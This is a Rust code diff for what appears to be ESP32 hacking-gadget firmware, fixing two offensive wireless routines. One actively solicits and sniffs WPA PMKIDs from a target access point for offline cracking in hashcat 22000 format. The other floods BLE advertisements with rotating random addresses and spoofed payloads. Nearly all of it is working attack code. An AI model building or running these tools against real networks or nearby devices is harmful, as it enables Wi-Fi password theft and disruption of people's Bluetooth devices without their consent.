@@ -938,34 +938,43 @@ impl Radio {
             *HS.0.get() = HsState::ZERO;
             (*HS.0.get()).target = bssid;
         }
-        // bring up a station configured for the target (throwaway pass) + the sniffer.
+        // EACH round brings up a FRESH station + sniffer and drives ONE managed connect.
+        // esp-radio 0.18 PANICS (ESP_ERR_WIFI_CONN, 0x3007) inside from_error_code if
+        // connect_async is reused on a DIRTY controller after a failed connect — the very
+        // trap assoc_once documents. So, exactly like assoc_once, every round fully
+        // re-inits the WiFi instead of looping connect on one controller. The throwaway-
+        // password connect makes the AP emit msg1 (PMKID); the promiscuous sniffer lifts
+        // it off-air in parallel. HS state was zeroed above and accumulates across rounds.
         self.deinit_ble();
-        self.deinit_wifi();
-        let w = self.wifi_periph.take().unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
-        let (mut c, ifs) = wifi::new(w, Default::default()).ok()?;
-        let cfg = StationConfig::default().with_ssid(ssid).with_password("echoputer-pmkid".into());
-        if c.set_config(&Config::Station(cfg)).is_err() {
-            // leave the radio in a clean state (don't strand a misconfigured controller
-            // that ensure_wifi would later reuse).
-            self.wifi_ctrl = Some(c);
-            self.wifi_ifaces = Some(ifs);
-            self.deinit_wifi();
-            return None;
-        }
-        self.wifi_ctrl = Some(c);
-        self.wifi_ifaces = Some(ifs);
-        {
-            let i = self.wifi_ifaces.as_mut()?;
-            i.sniffer.set_receive_cb(handshake_cb);
-            if i.sniffer.set_promiscuous_mode(true).is_err() {
-                self.deinit_wifi();
-                return None;
-            }
-        }
-        self.set_channel(channel);
         esp_println::println!("[PMKID] active solicit ch{}", channel);
         let mut rounds = 0u32;
         loop {
+            self.deinit_wifi();
+            let w = self.wifi_periph.take().unwrap_or_else(|| unsafe { esp_hal::peripherals::WIFI::steal() });
+            let (mut c, ifs) = match wifi::new(w, Default::default()) {
+                Ok(x) => x,
+                Err(_) => break,
+            };
+            let cfg = StationConfig::default().with_ssid(ssid).with_password("echoputer-pmkid".into());
+            if c.set_config(&Config::Station(cfg)).is_err() {
+                self.wifi_ctrl = Some(c);
+                self.wifi_ifaces = Some(ifs);
+                break;
+            }
+            self.wifi_ctrl = Some(c);
+            self.wifi_ifaces = Some(ifs);
+            {
+                let i = match self.wifi_ifaces.as_mut() {
+                    Some(i) => i,
+                    None => break,
+                };
+                i.sniffer.set_receive_cb(handshake_cb);
+                if i.sniffer.set_promiscuous_mode(true).is_err() {
+                    break;
+                }
+            }
+            // pin the channel AFTER enabling promiscuous (promiscuous can reset to ch1).
+            self.set_channel(channel);
             // a managed connect drives the assoc -> the AP sends msg1 (PMKID), then the
             // connect fails on the wrong password. The sniffer cb (WiFi task) sees msg1
             // in parallel while this block_on drives the attempt.
@@ -976,19 +985,30 @@ impl Radio {
                 ));
                 let _ = embassy_futures::block_on(c.disconnect_async());
             }
+            // promiscuous off before the next round's deinit (clean teardown).
+            if let Some(i) = self.wifi_ifaces.as_mut() {
+                let _ = i.sniffer.set_promiscuous_mode(false);
+            }
             rounds += 1;
             let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
             if HS_PMKID.load(Ordering::Relaxed) || !tick(eapol) || rounds >= 20 {
                 break;
             }
         }
-        if let Some(i) = self.wifi_ifaces.as_mut() {
-            let _ = i.sniffer.set_promiscuous_mode(false);
-        }
         Delay::new().delay_millis(30); // let any in-flight cb finish before we read
         let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
         // SAFETY: promiscuous mode is off now; the cb is quiesced.
         let snap = unsafe { *HS.0.get() };
+        // Diagnose a "no PMKID" outcome: target_m1=1 + pmkid=0 means the AP DID send a
+        // msg1 we captured but it carried no RSN PMKID KDE (this AP simply omits it — most
+        // do unless PMK caching/802.11r is on); target_m1=0 means we never captured a target
+        // msg1 (its own solicited msg1 may not be delivered to promiscuous on this chip).
+        esp_println::println!(
+            "[PMKID] done: eapol={} target_m1={} pmkid={}",
+            eapol,
+            snap.have_m1 as u8,
+            snap.have_pmkid as u8
+        );
         if !snap.have_pmkid {
             self.deinit_wifi();
             return Some(HsOutcome { eapol, captured: false, cracked: None, hc22000: None });
@@ -1567,21 +1587,33 @@ impl Radio {
             let mut buf = [0u8; 259];
             let mut sent = 0u32;
             let mut seq = 0u32;
+            // short drain = read the Command Complete after each HCI cmd; dwell = let the
+            // advertiser actually radiate a couple of intervals before the next rotation.
             let drain = || Deadline { start: Instant::now(), dur: Duration::from_millis(30) };
+            let dwell = || Deadline { start: Instant::now(), dur: Duration::from_millis(200) };
             if Transport::write(c, &Reset::new()).await.is_err() {
                 return None;
             }
             let _ = select(Transport::read(c, &mut buf), drain()).await;
+            // Reconfigure the advertiser each round. Drain the Command Complete after EACH
+            // command: the btdm controller grants a single outstanding HCI command
+            // (num_hci_cmd_pkts = 1), so pipelining without reading the response overruns
+            // that credit (the working scan path drains per-command for the same reason).
             loop {
                 let mac = ble_spam::random_mac(seq);
                 let (len, data) = ble_spam::payload(mode, seq);
                 let _ = Transport::write(c, &LeSetAdvEnable::new(false)).await;
+                let _ = select(Transport::read(c, &mut buf), drain()).await;
                 let _ = Transport::write(c, &LeSetRandomAddr::new(BdAddr::new(mac))).await;
+                let _ = select(Transport::read(c, &mut buf), drain()).await;
+                // adv interval >= 100 ms (0x00A0): the btdm ROM enforces the pre-BT5.0 floor
+                // for NON-connectable advertising and asserts (rwble.c, param = the offending
+                // interval) on anything lower — our old 20 ms (0x0020) was that param.
                 let _ = Transport::write(
                     c,
                     &LeSetAdvParams::new(
-                        HciDuration::<625>::from_millis(20),
-                        HciDuration::<625>::from_millis(40),
+                        HciDuration::<625>::from_millis(100),
+                        HciDuration::<625>::from_millis(150),
                         AdvKind::AdvNonconnInd,
                         AddrKind::RANDOM,
                         AddrKind::PUBLIC,
@@ -1591,10 +1623,13 @@ impl Radio {
                     ),
                 )
                 .await;
-                let _ = Transport::write(c, &LeSetAdvData::new(len, data)).await;
-                let _ = Transport::write(c, &LeSetAdvEnable::new(true)).await;
-                // let it advertise briefly + soak up any controller events
                 let _ = select(Transport::read(c, &mut buf), drain()).await;
+                let _ = Transport::write(c, &LeSetAdvData::new(len, data)).await;
+                let _ = select(Transport::read(c, &mut buf), drain()).await;
+                let _ = Transport::write(c, &LeSetAdvEnable::new(true)).await;
+                let _ = select(Transport::read(c, &mut buf), drain()).await;
+                // let it actually radiate for a couple of intervals before rotating
+                let _ = select(Transport::read(c, &mut buf), dwell()).await;
                 sent += 1;
                 seq = seq.wrapping_add(1);
                 if !tick(sent) {
